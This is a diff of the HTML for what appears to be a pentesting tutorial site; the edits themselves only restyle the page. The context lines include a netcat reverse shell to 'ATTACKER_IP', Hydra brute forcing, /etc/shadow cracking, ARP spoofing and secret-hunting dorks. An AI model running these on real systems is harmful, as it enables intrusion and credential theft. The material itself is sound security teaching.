@@ -224,12 +224,12 @@ th{background:var(--bg1);color:var(--cyn);font-family:var(--mono);font-weight:60
 td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:top}
 
 .tg{display:inline-block;padding:1px 5px;border-radius:3px;font-size:.6rem;font-family:var(--mono);font-weight:600;letter-spacing:.3px;text-transform:uppercase}
-.tg.g{background:rgba(74,222,128,.1);color:var(--grn)}.tg.c{background:rgba(56,189,248,.1);color:var(--cyn)}.tg.p{background:rgba(192,132,252,.1);color:var(--pur)}.tg.r{background:rgba(239,68,68,.1);color:var(--red)}.tg.o{background:rgba(249,115,22,.1);color:var(--org)}.tg.y{background:rgba(250,204,21,.1);color:var(--yel)}
+.tg.g{background:rgba(74,222,128,.1);color:var(--grn)}.tg.c{background:rgba(56,189,248,.1);color:var(--cyn)}.tg.p{background:rgba(192,132,252,.1);color:var(--pur)}.tg.r{background:rgba(239,68,68,.1);color:var(--red)}.tg.o{background:rgba(249,115,22,.1);color:var(--org)}.tg.y{background:rgba(250,204,21,.1);color:var(--yel)}.tg.pk{background:rgba(244,114,182,.1);color:var(--pnk)}
 
 .tbox{background:#0d1117;border:1px solid var(--card-bdr);border-radius:6px;overflow:hidden;margin:8px 0}
 .tbox-bar{background:rgba(255,255,255,.03);padding:4px 10px;display:flex;align-items:center;gap:4px;border-bottom:1px solid var(--bdr)}
 .td{width:8px;height:8px;border-radius:50%}.td.r{background:#ff5f56}.td.y{background:#ffbd2e}.td.g{background:#27c93f}
-.tbox-t{color:var(--txt3);font-size:.62rem;font-family:var(--mono);margin-left:4px;letter-spacing:.3px}
+.tbox-t,.tbox-bt{color:var(--txt3);font-size:.62rem;font-family:var(--mono);margin-left:4px;letter-spacing:.3px}
 .tbox-b{padding:8px 10px;font-family:var(--mono);font-size:.75rem;line-height:1.4;max-height:280px;overflow-y:auto;color:#c9d1d9;white-space:pre-wrap}
 
 .cref{background:var(--bg1);border:1px solid var(--bdr);border-radius:6px;padding:6px 8px;margin:4px 0;display:flex;align-items:flex-start;gap:6px}
@@ -260,6 +260,7 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
 .term-panel{display:none;position:fixed;bottom:80px;left:16px;width:min(380px,calc(100vw - 32px));height:320px;background:#0d1117;border:1px solid rgba(192,132,252,.3);border-radius:12px;z-index:200;flex-direction:column;transition:none;box-shadow:0 8px 40px rgba(0,0,0,.6),0 0 20px rgba(192,132,252,.1);overflow:hidden;resize:both;min-width:260px;min-height:180px}
 .term-panel.kb-active{transition:none}
 .term-panel.show{display:flex;animation:fadeIn .2s ease}
+.term-panel.hide-anim{animation:slideDown .2s ease forwards}
 .term-panel.maximized{bottom:0!important;left:0!important;right:0!important;width:100%!important;height:60vh!important;border-radius:12px 12px 0 0;resize:none}
 .term-bar{background:rgba(192,132,252,.08);padding:6px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid rgba(192,132,252,.2);flex-shrink:0;cursor:move;user-select:none}
 .term-bar .td{width:8px;height:8px}.term-title{color:var(--pur);font-family:var(--mono);font-size:.68rem;flex:1;letter-spacing:.3px;cursor:move}
@@ -496,7 +497,7 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <p>Beyond the CIA Triad, the AAA framework provides the operational structure for identity and access management:</p>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Authentication &mdash; "Who are you?"</span>
     </div>
@@ -512,7 +513,7 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Authorization &mdash; "What can you do?"</span>
     </div>
@@ -528,7 +529,7 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Accounting &mdash; "What did you do?"</span>
     </div>
@@ -568,7 +569,7 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <p>Psychological manipulation techniques that exploit human trust to bypass technical controls.</p>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Phishing Variants</span>
     </div>
@@ -586,7 +587,7 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Social Engineering Tactics</span>
     </div>
@@ -1353,7 +1354,7 @@ other::r--</div>
       <div class="di">&#128230;</div>
       <div class="dt">APT (Debian/Ubuntu/Kali)</div>
       <div class="dd">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>apt update           # Refresh package lists
+<pre><code>apt update           # Refresh package lists
 apt upgrade -y       # Upgrade all packages
 apt install nmap     # Install a package
 apt remove nmap      # Uninstall (keep config)
@@ -1367,7 +1368,7 @@ apt autoremove       # Remove orphaned deps</code></pre>
       <div class="di">&#128230;</div>
       <div class="dt">YUM/DNF (RHEL/Fedora)</div>
       <div class="dd">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>yum update           # Update all packages
+<pre><code>yum update           # Update all packages
 yum install nmap     # Install package
 yum remove nmap      # Remove package
 yum search nmap      # Search repos
@@ -1379,7 +1380,7 @@ dnf groupinstall "Security Tools"</code></pre>
       <div class="di">&#128230;</div>
       <div class="dt">Pacman (Arch/BlackArch)</div>
       <div class="dd">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>pacman -Syu          # Full system update
+<pre><code>pacman -Syu          # Full system update
 pacman -S nmap       # Install package
 pacman -R nmap       # Remove package
 pacman -Rns nmap     # Remove + config + deps
@@ -1396,12 +1397,12 @@ paru -S burpsuite    # AUR helper</code></pre>
   <p>Shell scripting automates repetitive tasks and chains commands. Bash is the default shell on most Linux systems.</p>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Variables, Input, and Output</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>#!/bin/bash
+      <pre><code>#!/bin/bash
 # Shebang line tells the system to use bash
 
 # Variables (NO spaces around =)
@@ -1438,12 +1439,12 @@ $$    # Current process ID</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Conditionals (if/else)</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>#!/bin/bash
+      <pre><code>#!/bin/bash
 
 # Basic if/else
 if [ -f "/etc/passwd" ]; then
@@ -1490,12 +1491,12 @@ fi</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Loops</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>#!/bin/bash
+      <pre><code>#!/bin/bash
 
 # For loop - iterate over a list
 for USER in alice bob charlie; do
@@ -1542,12 +1543,12 @@ done</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Functions</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>#!/bin/bash
+      <pre><code>#!/bin/bash
 
 # Function definition
 banner() {
@@ -1717,7 +1718,7 @@ parse_nmap_output() {
 
   <h3>Installation</h3>
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Installing Termux (Recommended Sources)</span>
     </div>
@@ -1732,7 +1733,7 @@ parse_nmap_output() {
         <li><strong>GitHub (Enhanced):</strong> <code>https://github.com/termux/termux-app/releases</code> &mdash; Check for latest pre-release</li>
       </ul>
       <p>After installation, immediately run the initial setup:</p>
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>termux-setup-storage
+      <pre><code>termux-setup-storage
 pkg update && pkg upgrade -y</code></pre>
     </div>
   </div>
@@ -1884,12 +1885,12 @@ deb https://mirrors.tuna.tsinghua.edu.cn/termux/apt/termux-main stable main
   <h2>Python &amp; Ruby Setup</h2>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Python Development Environment</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install Python
+      <pre><code># Install Python
 pkg install python
 
 # Verify installation
@@ -1925,12 +1926,12 @@ pip install pwntools         # CTF/exploit framework</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Ruby Setup</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install Ruby
+      <pre><code># Install Ruby
 pkg install ruby
 
 # Verify
@@ -1963,12 +1964,12 @@ ruby hello.rb</code></pre>
   <p>Here's how to set up the most essential penetration testing tools.</p>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Nmap - Network Scanner</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install Nmap
+      <pre><code># Install Nmap
 pkg install nmap
 
 # Basic scans
@@ -1995,12 +1996,12 @@ nmap --script "ssl-*" target # Run all SSL scripts</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Metasploit Framework</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install dependencies
+      <pre><code># Install dependencies
 pkg install curl autoconf bison clang coreutils
 pkg install freetype libcrypt libgcrypt libgmp libpcap
 pkg install libsqlite libxml2 ncurses ncurses-utils ncurses-ui-libs
@@ -2038,12 +2039,12 @@ msf6 > db_nmap 192.168.1.0/24  # Run nmap through MSF database</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">SQLMap - SQL Injection</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install SQLMap
+      <pre><code># Install SQLMap
 pkg install sqlmap
 # Or from GitHub
 git clone https://github.com/sqlmapproject/sqlmap.git
@@ -2074,12 +2075,12 @@ python sqlmap.py -u "http://target/?id=1" --random-agent --delay=1</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Hydra - Password Cracking</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install Hydra
+      <pre><code># Install Hydra
 pkg install hydra
 
 # SSH brute force
@@ -2109,12 +2110,12 @@ hydra -l admin -P passwords.txt -f target service
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">John the Ripper - Password Hash Cracking</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install John the Ripper
+      <pre><code># Install John the Ripper
 pkg install john
 
 # Or build from source (recommended for Termux)
@@ -2151,12 +2152,12 @@ unshadow /etc/passwd /etc/shadow > hashes.txt</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Additional Essential Tools</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># WiFi tools
+      <pre><code># WiFi tools
 pkg install aircrack-ng wifite
 airmon-ng start wlan0
 airodump-ng wlan0mon
@@ -2193,12 +2194,12 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc ATTACKER_IP 4444 >/tmp
   <p>Customize your Termux environment for productivity and aesthetics.</p>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Zsh + Oh My Zsh Setup</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install Zsh
+      <pre><code># Install Zsh
 pkg install zsh
 
 # Install Oh My Zsh
@@ -2225,12 +2226,12 @@ source ~/.zshrc</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Termux Styling &amp; Configuration</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Termux properties file
+      <pre><code># Termux properties file
 mkdir -p ~/.termux
 nano ~/.termux/termux.properties
 
@@ -2264,12 +2265,12 @@ source ~/.bashrc</code></pre>
   <p>You can run graphical Linux applications on your phone using a VNC server or X11 display.</p>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">VNC Server Setup</span>
     </div>
     <div class="col-b">
-      <pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install a desktop environment and VNC server
+      <pre><code># Install a desktop environment and VNC server
 pkg install x11-repo
 pkg install tigervnc xfce4
 
@@ -2367,7 +2368,7 @@ DISPLAY=:0 xfce4-terminal &</code></pre>
   <h2>Troubleshooting Common Issues</h2>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Common Errors &amp; Fixes</span>
     </div>
@@ -2419,7 +2420,7 @@ DISPLAY=:0 xfce4-terminal &</code></pre>
   </div>
 
   <div class="col">
-    <div class="col-h" onclick="toggleCol(this)">
+    <div class="col-h">
       <span class="ci">&#9654;</span>
       <span class="ct">Performance Tips</span>
     </div>
@@ -2614,9 +2615,9 @@ DISPLAY=:0 xfce4-terminal &</code></pre>
 </div>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">TCP Handshake — Wireshark-style</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">TCP Handshake — Wireshark-style</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>Client → Server    [SYN]      Seq=0
+<pre><code>Client → Server    [SYN]      Seq=0
 Server → Client    [SYN,ACK]  Seq=1000, Ack=1
 Client → Server    [ACK]      Seq=1, Ack=1001
                     ──── Connection Established ────
@@ -2685,9 +2686,9 @@ Client → Server    [ACK]      Seq=101, Ack=2501</code></pre>
 <p>CIDR (Classless Inter-Domain Routing) replaces classful addressing. The suffix number indicates how many bits are the network portion.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">CIDR Examples</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">CIDR Examples</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>192.168.1.0/24
+<pre><code>192.168.1.0/24
   ├── 192.168.1  = network portion (24 bits)
   └── .0          = host portion (8 bits)
   Hosts: 2^8 - 2 = 254 usable hosts (.1 - .254)
@@ -2742,9 +2743,9 @@ Common CIDR table:
 
 <h3>DNS Resolution Process</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Recursive DNS Lookup Flow</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Recursive DNS Lookup Flow</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>1. User types "www.example.com" in browser
+<pre><code>1. User types "www.example.com" in browser
 2. Browser checks local cache → MISS
 3. OS checks hosts file → MISS
 4. OS checks local DNS resolver cache → MISS
@@ -2779,9 +2780,9 @@ Common CIDR table:
 <p>Automatically assigns IP addresses and network configuration to devices.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">DHCP DORA Process</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">DHCP DORA Process</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>Client → Broadcast    DHCPDISCOVER     (src: 0.0.0.0, dst: 255.255.255.255)
+<pre><code>Client → Broadcast    DHCPDISCOVER     (src: 0.0.0.0, dst: 255.255.255.255)
 Server → Unicast      DHCPOFFER        (offers IP: 192.168.1.100, mask: 255.255.255.0)
 Client → Broadcast    DHCPREQUEST      (requests 192.168.1.100)
 Server → Unicast      DHCPACK          (confirms lease, gateway, DNS, etc.)
@@ -2800,9 +2801,9 @@ Lease: 86400s (24 hours) — client renews at 50% (T1) and 87.5% (T2)</code></pr
 <p>Resolves Layer 3 (IP) addresses to Layer 2 (MAC) addresses within a local network.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">ARP Communication</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">ARP Communication</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># ARP Request (broadcast)
+<pre><code># ARP Request (broadcast)
 Who has 192.168.1.1? Tell 192.168.1.100
 [ARP Request] Src MAC: aa:bb:cc:dd:ee:00 Dst MAC: ff:ff:ff:ff:ff:ff
 
@@ -2835,9 +2836,9 @@ Address         HWtype  HWaddress           Flags Mask  Iface
 
 <h3>HTTP Request/Response</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">HTTP Request &amp; Response</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">HTTP Request &amp; Response</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>─── REQUEST ───
+<pre><code>─── REQUEST ───
 GET /api/users?id=42 HTTP/1.1
 Host: www.example.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
@@ -2876,9 +2877,9 @@ Strict-Transport-Security: max-age=31536000
 <p>Transport Layer Security secures HTTP (HTTPS). TLS 1.3 reduced the handshake from 2-RTT to 1-RTT.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">TLS 1.3 Handshake</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">TLS 1.3 Handshake</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code>Client → Server:  ClientHello
+<pre><code>Client → Server:  ClientHello
                    ├── Supported TLS versions (1.3)
                    ├── Cipher suites (e.g., TLS_AES_256_GCM_SHA384)
                    ├── Key share (ECDHE public key)
@@ -2961,9 +2962,9 @@ Client ↔ Server:  [Application Data] (encrypted with derived session key)</cod
 </table>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Port Forwarding (iptables)</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Port Forwarding (iptables)</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Forward external port 8080 to internal server 192.168.1.50:80
+<pre><code># Forward external port 8080 to internal server 192.168.1.50:80
 iptables -t nat -A PREROUTING -p tcp --dport 8080 \
   -j DNAT --to-destination 192.168.1.50:80
 
@@ -3030,9 +3031,9 @@ socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80</code></pre>
 <div class="col-b">
 <p>Attacker sends unsolicited ARP replies to associate their MAC address with the IP of another host (typically the default gateway).</p>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">ARP Spoofing with arpspoof</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">ARP Spoofing with arpspoof</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Enable IP forwarding so traffic still flows
+<pre><code># Enable IP forwarding so traffic still flows
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Spoof ARP replies to the victim
@@ -3161,9 +3162,9 @@ arpwatch -i eth0</code></pre>
 
 <h3>Powerful Google Dork Combos</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Google Dork Examples</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Google Dork Examples</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Find exposed login pages
+<pre><code># Find exposed login pages
 inurl:login OR inurl:admin OR inurl:portal site:target.com
 
 # Find exposed directory listings
@@ -3209,9 +3210,9 @@ site:s3.amazonaws.com "target"</code></pre>
 
 <h3>Shodan Filters</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Shodan Query Examples</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Shodan Query Examples</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Find Apache servers in a country
+<pre><code># Find Apache servers in a country
 apache country:US
 
 # Find specific version with vulnerabilities
@@ -3264,9 +3265,9 @@ hostname:*.target.com</code></pre>
 <p>Discover email addresses associated with a target domain for password spraying, credential stuffing, and social engineering attacks.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Email Recon Tools</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Email Recon Tools</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># theHarvester — comprehensive email/domain recon
+<pre><code># theHarvester — comprehensive email/domain recon
 theHarvester -d target.com -b all -f results.html
 theHarvester -d target.com -b google,linkedin,github -l 200
 
@@ -3289,9 +3290,9 @@ curl "https://haveibeenpwned.com/api/v3/breachedaccount/email@example.com"</code
 <p>Check if a username exists on various platforms — useful for building a target profile.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Username Enumeration Tools</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Username Enumeration Tools</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Sherlock — username checks across 400+ sites
+<pre><code># Sherlock — username checks across 400+ sites
 sherlock username --json results.json
 sherlock targetuser --timeout 10 --print-found
 
@@ -3315,9 +3316,9 @@ curl -s -o /dev/null -w "%{http_code}" \
 <p>Discover subdomains of a target domain. Subdomains often reveal internal applications, staging environments, and forgotten services.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Subdomain Enumeration Commands</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Subdomain Enumeration Commands</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Amass — comprehensive subdomain enumeration
+<pre><code># Amass — comprehensive subdomain enumeration
 amass enum -passive -d target.com -o amass_passive.txt
 amass enum -active -d target.com -brute -w wordlist.txt -o amass_active.txt
 amass intel -org "Target Company"  # find all domains belonging to org
@@ -3354,9 +3355,9 @@ massdns -r resolvers.txt -t A all_subs.txt -o S -w resolved.txt</code></pre>
 <h2>WHOIS &amp; DNS Enumeration</h2>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">WHOIS &amp; DNS Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">WHOIS &amp; DNS Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># WHOIS — domain registration info
+<pre><code># WHOIS — domain registration info
 whois target.com
 # Key data: registrar, creation/expiry dates, name servers, registrant org
 
@@ -3390,9 +3391,9 @@ dig +noall +answer target.com TXT</code></pre>
 <p>CT logs are public records of all SSL/TLS certificates issued. They reveal subdomains and infrastructure without touching the target.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Certificate Transparency Queries</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Certificate Transparency Queries</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Query crt.sh web interface
+<pre><code># Query crt.sh web interface
 curl -s "https://crt.sh/?q=target.com&amp;output=json" | jq '.[].name_value' | sort -u
 
 # Using the crt.sh API
@@ -3417,9 +3418,9 @@ ct-search search --domain target.com --json
 <p>Historical web content reveals deleted pages, old technology versions, hidden endpoints, and information that the target tried to remove.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Wayback Machine Recon</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Wayback Machine Recon</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Wayback Machine API
+<pre><code># Wayback Machine API
 curl "https://web.archive.org/cdx/search/cdx?url=target.com/*&amp;output=text&amp;fl=original" | sort -u
 
 # Find specific file types in history
@@ -3451,9 +3452,9 @@ echo "target.com" | gau --threads 5 | sort -u
 <p>Identify what technologies, frameworks, CMS, and versions a target website uses.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Technology Fingerprinting Tools</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Technology Fingerprinting Tools</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Wappalyzer — browser extension or CLI
+<pre><code># Wappalyzer — browser extension or CLI
 # Detects: CMS, frameworks, JS libraries, server, analytics, CDNs
 
 # WhatWeb — command-line fingerprinting
@@ -3489,9 +3490,9 @@ nmap --script http-generator,http-server-header -p 80,443 target.com</code></pre
 <p>Developers frequently commit secrets (API keys, passwords, internal URLs) to public repositories.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">GitHub Dorking</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">GitHub Dorking</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Search for secrets in code
+<pre><code># Search for secrets in code
 "target.com" password
 "target.com" api_key OR apikey OR api-key
 "target.com" secret OR token OR credential
@@ -3532,9 +3533,9 @@ python3 GitDorker.py -d target.com -q dorks.txt -t GITHUB_TOKEN -o results.csv</
 <p>Check if employees or systems have been exposed in known data breaches.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Data Breach Lookup</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Data Breach Lookup</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Have I Been Pwned (HIBP) — web interface
+<pre><code># Have I Been Pwned (HIBP) — web interface
 # Visit haveibeenpwned.com
 
 # HIBP API — check email against breaches
@@ -3578,9 +3579,9 @@ curl -H "hibp-api-key: YOUR_KEY" \
 </div>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Recon-ng Workspace Setup</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Recon-ng Workspace Setup</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Launch recon-ng
+<pre><code># Launch recon-ng
 recon-ng
 
 # Create a workspace
@@ -3620,9 +3621,9 @@ workspace target_recon
 <p>Extract hidden metadata from files — EXIF data in images, author names in documents, GPS coordinates, software versions, and more.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">ExifTool Usage</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">ExifTool Usage</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install ExifTool
+<pre><code># Install ExifTool
 apt install libimage-exiftool-perl
 
 # Read all metadata from a file
@@ -3678,9 +3679,9 @@ exiftool -r /path/to/images/
 </div>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">LinkedIn Recon</span></div>
